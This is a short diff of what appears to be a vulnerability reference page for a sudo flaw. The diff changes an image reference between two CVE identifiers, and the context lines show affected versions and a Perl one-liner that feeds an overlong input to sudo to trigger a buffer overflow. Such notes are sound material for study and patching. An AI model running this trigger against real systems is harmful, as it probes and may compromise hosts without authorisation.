@@ -15,7 +15,7 @@
 - **Affected Version**: Sudo versions 1.7.1 to 1.8.30 inclusive on Red Hat/CentOS
 - **Example**:
 
-![](CVE-2019-14287.png)
+![](CVE-2019-18634.png)
 
 - **Command**: perl -e 'print(("A" x 100 . chr(0)) x 50)' | sudo -S -k id
 
